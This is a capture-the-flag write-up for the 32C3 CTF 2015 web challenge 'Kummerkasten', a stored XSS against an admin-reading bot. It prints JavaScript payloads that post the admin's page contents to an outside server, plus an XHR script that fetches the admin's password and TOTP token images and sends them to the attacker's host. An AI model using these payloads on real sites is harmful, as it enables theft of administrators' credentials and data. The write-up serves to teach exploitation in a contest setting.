# 32C3 CTF 2015 : Kummerkasten

**Category:** Web
**Points:** 300
**Solves:** 61
**Description:**

> Our Admin is a little sad this time of the year. Maybe you can cheer him up at this site <http://136.243.194.46/>
>
>
> Please note: This challenge does not follow the flag format.
>
>
> Hints:
>
> To build the flag, concatenate both parts and omit '32C3_'


## Write-up

Strangely, this 32c3 CTF task weighted 300 points (while *ITD* was "only" 150) however it was a ~~simple~~ straightforward XSS. You're given a page like this: ![](http://i.imgur.com/7vUobWP.png)

*Your team* is nearly arbitrary (just a basic filter) and the injectable field is the message itself. It is possible to inject `<script src="yourstuff.js"></script>` right away. Clearly, there's a bot reading all the messages so the first thing right off the bat I did was to hook in [BeEF](http://beefproject.com/). The bot appeared in the logs shortly and then disconnected. I wasn't really disappointed as the original page already contained jQuery code so coding payloads would be a cakewalk.

First I dumped the current page the bot was seeing:

```javascript
$.post('http://myserver', {'a': btoa($('body')[0].innerHTML)})
```

The bot returned this:

```html
<script src="js/jquery-2.1.4.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/admin.js"></script>

    <nav class="navbar navbar-inverse">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="/admin/comments">Admin</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li class="active comments comment"><a href="/admin/comments">Comments</a></li>
            <li class="bugs"><a href="/admin/bugs">Bugs</a></li>
          </ul>
          <img src="img/spinner.svg" class="spinner pull-right" style="height: 50px; display: none;">
	<ul class="nav navbar-nav navbar-right">
	  <li class="token"><a href="/admin/token">HACK - Token</a></li>
	</ul>
        </div>
      </div>
    </nav>

    <div class="container" id="content">


      <div>
        <h1>Good news!</h1>
        <div class="comment">
            <blockquote>
                <p>lol<script>$.post('http://standard.io:4446', {'a': btoa($('body')[0].innerHTML)})</script></p></blockquote></div></div></div>
```

`document.cookie` was empty/inaccessible so I guessed the links in the top panel are way to go.  We have only `admin/token`, `admin/bugs` and `admin/comments`. I first fetched `admin/bugs` the same way:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="Admin">
    <meta name="author" content="The lonely admin">
    <link rel="icon" href="img/favicon.ico">

    <title>Admin</title>
    <base href="/">

    <link href="css/bootstrap.min.css" rel="stylesheet">

  </head>

  <body>

    <script src="js/jquery-2.1.4.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/admin.js"></script>

    <nav class="navbar navbar-inverse">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="/admin/comments">Admin</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li class="active comments comment"><a href="/admin/comments">Comments</a></li>
            <li class="bugs"><a href="/admin/bugs">Bugs</a></li>
          </ul>
          <img src="img/spinner.svg" class="spinner pull-right" style="height: 50px; display: none;"/>
	<ul class="nav navbar-nav navbar-right">
	  <li class="token"><a href="/admin/token">HACK - Token</a></li>
	</ul>
        </div>
      </div>
    </nav>

    <div class="container" id="content">

      <div class="row">
      <div class="col-md-6">
        <h1>Bug reports</h1>
        <div class="bug">
	    <p><h4>New bug report from Zero Cool on 2015-12-28</h4></p>
                <p>Hello Admin,...
		I know that you're not in a good place right now. I've been
		told to go easy on you. But guess what I just found browsing
		through the latest commits to our PUBLIC (!!!!) GitHub
		repository.
		</p>
		<img src="admin/img/root_pw.png?20151228" id="img-bug-0003"/>
		<p>
        Is this really our production MySQL password? And is this by any chance
        the exact same password you're using everywhere else?  <br/>
		<b>Are you fucking kidding me?</b><br/>
        Please tell me that this is not also your password for the admin section...<br/>
        The only thing that luckily prevents anyone from exploiting this is
        that we enforce Two Factor Authentication. Even an imbecile
        like you can't fuck this up since it's only stored on your phone...<br/>
        Sorry admin, but this is unacceptable. I've deleted the checkin from
        the repo and I don't think anyone saw the commit...</p>
        <footer>Zero Cool on 2015-12-28</footer>
        </div>
        <hr/>
        <div class="bug">
	    <p><h4>New bug report from Acid Burn on 2015-12-20</h4></p>
            <blockquote>
                <p>Hello Admin,
        Sorry for filing a bug, but I thought this was the quickest way to
        reach you. I've found the library you were looking for, it's called
        pyotp. You haven't told me what you're planning on doing with it, but
        knowing you it will be something really cool. I've found that the
        easiest way to use the token is to just append it to your password
        (i.e. as the last six digits).</p>

		<p>I probably don't have to tell you to keep your TOTP token
		(and especially the seed) safe from prying eyes ;)</p>
                <footer>Acid Burn on 2015-12-20</footer>
            </blockquote>
        </div>
      </div>
      </div>
    </div>

  </body>
</html>

```

This is a clue that perhaps we need to take a look at the (potential) snapshot which is `<img src="admin/img/root_pw.png?20151228" id="img-bug-0003"/>` and fetch some token as well. Looking into `admin/token` reveals:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="Admin">
    <meta name="author" content="The lonely admin">
    <link rel="icon" href="img/favicon.ico">

    <title>Admin</title>
    <base href="/">

    <link href="css/bootstrap.min.css" rel="stylesheet">

  </head>

  <body>

    <script src="js/jquery-2.1.4.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/admin.js"></script>

    <nav class="navbar navbar-inverse">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="/admin/comments">Admin</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li class="active comments comment"><a href="/admin/comments">Comments</a></li>
            <li class="bugs"><a href="/admin/bugs">Bugs</a></li>
          </ul>
          <img src="img/spinner.svg" class="spinner pull-right" style="height: 50px; display: none;"/>
	<ul class="nav navbar-nav navbar-right">
	  <li class="token"><a href="/admin/token">HACK - Token</a></li>
	</ul>
        </div>
      </div>
    </nav>

    <div class="container" id="content">

      <div>
        <h1>TOTP Token for today</h1>
        <p>
        The token for today is:<br/>
        <img src="admin/img/token.png?20151228" id="img-token"/>
        </p>
        </div>
      </div>
    </div>

  </body>
</html>
```

So we have two images of interest:

`<img src="admin/img/token.png?20151228" id="img-token"/>` and `<img src="admin/img/root_pw.png?20151228" id="img-bug-0003"/>`. So I proceed with this code:

```javascript
var url                 = "/admin/img/root_pw.png?20151228";
var request             = new XMLHttpRequest();
request.open ("GET", url, true);
request.responseType    = "arraybuffer";
request.send(null);

setTimeout(function(){

	var blob = new Blob([request.response], {type: "image/png"});
	var oReq = new XMLHttpRequest();
	oReq.open("POST", "http://myserver", true);
	oReq.send(blob);

}, 4000)
```

On my server, all this time, I'm just using netcat (yes, eponym) and feeding it an [HTTP response](https://gist.github.com/0xBADCA7/9829ec7f3364fd0b165e) with CORS headers, otherwise any modern browser would halt the request:

```http
HTTP/1.1 200 OK
Server: MSLC
Date: Sun, 28 Dec 2015 08:50:04 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: Accept-Encoding
Status: 200 OK
Cache-Control: no-cache
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: GET, POST, PUT

```

```http
HTTP/1.1 200 OK
Server: MSLC
Date: Sun, 28 Dec 2015 08:50:04 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: Accept-Encoding
Status: 200 OK
Cache-Control: no-cache
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: GET, POST, PUT
```

One is for the `OPTIONS` request and another is the answer itself.

The bot was apparently down for a while but then I saw a callback in the terminal in the middle of the night with the good news - both images arrived. As the request was raw and I did not base64 it I just ran `binwalk` on it and extracted the PNGs:

![](http://i.imgur.com/6umTaWx.png)
----

![](http://i.imgur.com/yUNbloa.png)

As the task was saying that the format of the flag is not of the standard form I concatenated the token with the password and it went through.


## Other write-ups and resources

* <https://github.com/andihit/ctf-write-ups/blob/master/2015/32c3/kummerkasten.md>
* <http://breaking.into.systems/2015/12/29/32c3ctf-kummerkasten-writeup/>
* <http://nandynarwhals.org/2015/12/31/32c3ctf-kummerkasten-web-300/>
